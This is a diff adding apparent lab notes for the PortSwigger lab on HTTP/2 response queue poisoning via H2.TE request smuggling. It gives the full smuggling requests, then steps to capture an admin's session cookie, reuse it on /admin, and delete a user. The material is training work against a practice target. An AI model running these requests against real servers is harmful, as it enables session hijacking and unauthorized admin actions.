@@ -362,3 +362,77 @@ x=1
 
 Will trigger on the next visitor 
 
+**Response queue poisoning via H2.TE request smuggling**
+
+Smuggled arbitrary prefix of body  of http/2 request using chunked encoding 
+
+```
+POST / HTTP/2
+Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 13
+
+0
+
+SMUGGLED
+```
+
+
+
+Will get a 404 response after to send. Confirmed that you caused the back-end to append the subsequent request to the smuggled prefix
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9412e439-6e75-4eba-a415-7cc61928aeab)
+
+
+
+
+Send the following request to poison the response queue 
+```
+POST / HTTP/2
+Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 85
+
+0
+
+GET /x HTTP/1.1
+Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
+```
+
+ Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header. 
+
+You will receive the 404 response to your own request
+Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie. 
+Send 10 ordinary response  to reset.
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bc7a5dcb-8dac-4219-a974-f04fbb8415b8)
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling> 
+
+
+
+
+
+Copy the session cookie and use it to send the following request to the admin panel 
+
+```
+GET /admin HTTP/2
+Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
+Cookie: session=STOLENESSIONCOOKIE
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dca51d14-bffc-4b67-8714-75db041e3433)
+
+
+
+
+
+To delete 
+
+```
+GET /admin/delete?username=carlos HTTP/2
+Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
+Cookie: session=eiVlUrLVr93i4N4PmuH0J2fKcumc6Hi9
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d71683aa-c5c9-4416-bd10-6a46a388629c)
+
+
+
+
